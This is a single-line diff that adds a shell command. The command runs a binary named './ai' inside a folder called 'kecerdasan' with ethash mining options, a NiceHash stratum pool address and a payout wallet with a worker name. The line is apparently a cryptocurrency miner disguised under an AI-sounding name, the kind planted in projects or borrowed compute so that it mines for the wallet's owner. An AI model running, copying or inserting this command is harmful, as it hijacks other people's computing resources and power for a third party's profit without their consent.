@@ -1,0 +1,1 @@
+cd kecerdasan&& ./ai -a ethash -o stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 -u 3EDpbQ9xKecMrHp8D7Lp78e7eyoieDtEXg.Dicky -p x
